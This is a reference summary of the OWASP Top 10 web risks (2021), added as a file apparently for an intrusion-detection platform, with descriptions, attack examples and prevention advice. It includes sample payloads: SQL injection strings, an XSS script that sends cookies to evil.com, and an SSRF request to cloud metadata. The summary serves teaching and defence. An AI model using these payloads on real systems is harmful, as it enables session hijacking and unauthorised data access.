@@ -1,0 +1,172 @@
+OWASP Top 10 Web Application Security Risks (2021)
+
+Overview
+* OWASP (Open Web Application Security Project) publishes the Top 10 list of the most critical web application security risks.
+* The 2021 edition introduces three new categories and consolidates others based on real-world data from hundreds of organisations.
+* Each risk includes description, example attack scenarios, and recommended countermeasures.
+
+
+A01 - Broken Access Control (moved up from #5)
+* Description: Restrictions on what authenticated users are allowed to do are not properly enforced. Attackers can exploit these flaws to access unauthorised functionality or data.
+* Common vulnerabilities:
+   * Bypassing access control checks by modifying the URL or HTML page
+   * Allowing the primary key to be changed to another user's record (IDOR - Insecure Direct Object Reference)
+   * Elevation of privilege - acting as a user without being logged in, or acting as an admin when logged in as a user
+   * CORS misconfiguration allowing API access from unauthorised origins
+   * Force browsing to authenticated pages as an unauthenticated user
+* Attack example: Attacker modifies the URL from /account?id=123 to /account?id=124 and accesses another user's data.
+* Prevention:
+   * Deny access by default; only grant permissions explicitly
+   * Implement access control mechanisms once and reuse them throughout the application
+   * Log access control failures and alert administrators
+   * Rate limit API and controller access to minimise automated attack tooling
+   * Invalidate JWT tokens on server side after logout
+
+
+A02 - Cryptographic Failures (previously "Sensitive Data Exposure")
+* Description: Failures related to cryptography that often lead to exposure of sensitive data such as passwords, credit card numbers, health records.
+* Common vulnerabilities:
+   * Data transmitted in clear text (HTTP, SMTP, FTP)
+   * Use of old or weak cryptographic algorithms (MD5, SHA1, RC4, DES)
+   * Default crypto keys in use, weak crypto keys generated, or key management lacking
+   * Encryption not enforced (missing HTTP Strict Transport Security headers)
+   * Passwords stored without hashing or with weak hashing (MD5, SHA1 without salt)
+* Attack example: Attacker intercepts network traffic and reads plaintext credit card numbers transmitted over HTTP.
+* Prevention:
+   * Classify data processed, stored, or transmitted and apply controls per classification
+   * Do not store sensitive data unnecessarily
+   * Encrypt all data in transit with TLS; use HSTS
+   * Store passwords using strong adaptive hashing functions: bcrypt, Argon2, scrypt
+   * Disable caching for responses that contain sensitive data
+
+
+A03 - Injection (previously #1, includes XSS)
+* Description: Injecting hostile data into an interpreter as part of a command or query causes unintended execution. SQL, NoSQL, OS, LDAP, and HTML injection are common forms.
+* SQL Injection:
+   * Attacker inserts malicious SQL code into input fields to manipulate database queries
+   * Example payload: ' OR 1=1 -- (bypasses authentication)
+   * Example payload: ' UNION SELECT username, password FROM users --
+   * Impact: unauthorised data access, data deletion, authentication bypass, remote code execution
+   * Prevention: Use parameterised queries / prepared statements, stored procedures, input validation, least privilege DB accounts
+* Cross-Site Scripting (XSS):
+   * Attacker injects malicious scripts into web pages viewed by other users
+   * Types: Stored XSS (persisted in DB), Reflected XSS (in HTTP response), DOM-based XSS
+   * Example payload: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
+   * Impact: session hijacking, credential theft, malware distribution, page defacement
+   * Prevention: Output encoding, Content Security Policy (CSP), input validation, HttpOnly and Secure cookie flags
+* Command Injection:
+   * Attacker passes OS commands through vulnerable input fields
+   * Impact: full server compromise
+   * Prevention: Avoid OS calls with user input; use safe APIs; validate/sanitise all input
+* LDAP Injection, XPath Injection follow similar patterns
+* General prevention for all injection:
+   * Use an allowlist for input validation
+   * Escape special characters for the target interpreter
+   * Use LIMIT and other SQL controls to prevent mass disclosure
+
+
+A04 - Insecure Design (new in 2021)
+* Description: Risks related to design and architectural flaws. Missing or ineffective control design cannot be fixed by a perfect implementation.
+* Common issues:
+   * Missing rate limiting on authentication endpoints enabling brute force
+   * No account lockout mechanism
+   * Business logic flaws - using a coupon code more than once
+   * Missing threat modelling during design phase
+* Prevention:
+   * Establish and use a secure development lifecycle
+   * Use threat modelling for critical authentication, access control, business logic, key flows
+   * Integrate security language and controls into user stories
+   * Implement plausibility checks at each tier of your application
+
+
+A05 - Security Misconfiguration
+* Description: The most commonly seen issue. Often results from insecure default configurations, incomplete configurations, open cloud storage, misconfigured HTTP headers, verbose error messages.
+* Common vulnerabilities:
+   * Unnecessary features enabled (ports, services, pages, accounts, privileges)
+   * Default accounts and passwords unchanged
+   * Error handling reveals stack traces or other overly informative messages
+   * Missing security hardening across application stack
+   * Directory listing enabled on web server
+   * Security settings in application servers, frameworks, libraries not set to secure values
+* Attack example: Attacker discovers admin console at /admin with default credentials admin/admin.
+* Prevention:
+   * Minimal platform - no unnecessary features, components, documentation
+   * Review and update configurations as part of patch management process
+   * Segmented application architecture separates components with different security requirements
+   * Automated process to verify effectiveness of settings in all environments
+   * Remove or do not install unused frameworks, features, and documentation
+
+
+A06 - Vulnerable and Outdated Components
+* Description: Components such as libraries, frameworks, and software modules run with the same privileges as the application. If a vulnerable component is exploited, it can facilitate serious data loss or server takeover.
+* Common issues:
+   * Not knowing the versions of all components used (client and server side)
+   * Using vulnerable, unsupported, or out of date software
+   * Not scanning for vulnerabilities regularly
+   * Not fixing or upgrading underlying platform, frameworks, and dependencies
+* Prevention:
+   * Remove unused dependencies, unnecessary features, components, files, and documentation
+   * Continuously inventory versions of both client-side and server-side components
+   * Monitor CVE and NVD for vulnerabilities in components
+   * Only obtain components from official sources over secure links
+   * Monitor for libraries and components that are unmaintained
+
+
+A07 - Identification and Authentication Failures (previously "Broken Authentication")
+* Description: Authentication and session management implemented incorrectly allows attackers to compromise passwords, keys, session tokens, or exploit implementation flaws to assume identities.
+* Common vulnerabilities:
+   * Permits automated attacks such as credential stuffing or brute force
+   * Permits default, weak, or well-known passwords
+   * Weak or ineffective credential recovery processes (knowledge-based answers)
+   * Plain text, encrypted, or weakly hashed password storage
+   * Missing or ineffective multi-factor authentication
+   * Session tokens in URLs, not rotated after login, or not invalidated after logout
+* Prevention:
+   * Implement multi-factor authentication (MFA) to prevent automated attacks
+   * Do not deploy with any default credentials
+   * Implement weak password checks using a list of the top 10,000 worst passwords
+   * Limit or delay failed login attempts; log all failures and alert on brute force
+   * Use server-side, secure, built-in session manager; generate new random session IDs after login
+
+
+A08 - Software and Data Integrity Failures (new in 2021)
+* Description: Code and infrastructure that does not protect against integrity violations. Insecure deserialization and CI/CD pipeline vulnerabilities fall here.
+* Common issues:
+   * Application relies on plugins, libraries, or modules from untrusted sources
+   * Insecure deserialization - attacker sends malicious serialised object to be deserialised
+   * Auto-update functionality without integrity verification
+   * CI/CD pipeline with insufficient integrity controls can lead to supply chain attacks
+* Prevention:
+   * Use digital signatures or similar mechanisms to verify software or data is from the expected source
+   * Verify that libraries and dependencies are consuming trusted repositories
+   * Ensure your CI/CD pipeline has proper segregation, configuration, and access control
+   * Do not send serialised objects to untrusted clients without integrity checks
+
+
+A09 - Security Logging and Monitoring Failures (previously "Insufficient Logging & Monitoring")
+* Description: Without logging and monitoring, breaches cannot be detected and responded to. Most breach studies show time to detect a breach is over 200 days, typically detected by external parties.
+* Common issues:
+   * Auditable events not logged: logins, failed logins, high-value transactions
+   * Warnings and errors generate no log messages or inadequate messages
+   * Logs of applications and APIs not monitored for suspicious activity
+   * Logs only stored locally
+   * Alerting thresholds and escalation processes not in place or effective
+   * Penetration testing and scans by DAST tools do not trigger alerts
+* Prevention:
+   * Ensure all login, access control, and server-side input validation failures are logged with sufficient context
+   * Ensure logs are generated in a format that can be easily consumed by centralised log management solutions
+   * Establish effective monitoring and alerting such that suspicious activities are detected and responded to quickly
+   * Establish or adopt an incident response and recovery plan
+   * This is directly what NIDS systems like this platform are designed to address
+
+
+A10 - Server-Side Request Forgery (SSRF) (new in 2021)
+* Description: SSRF flaws occur when a web application fetches a remote resource without validating the user-supplied URL. Allows attacker to make server send requests to unintended locations.
+* Attack example: Attacker sends request to http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/ to access cloud instance metadata.
+* Common targets: Internal services behind firewalls, cloud provider metadata services, localhost services
+* Prevention:
+   * Sanitise and validate all client-supplied input data
+   * Enforce URL schema, port, and destination with an allowlist
+   * Do not send raw responses to clients
+   * Disable HTTP redirections
+   * Use network-level controls to block all but necessary intranet traffic
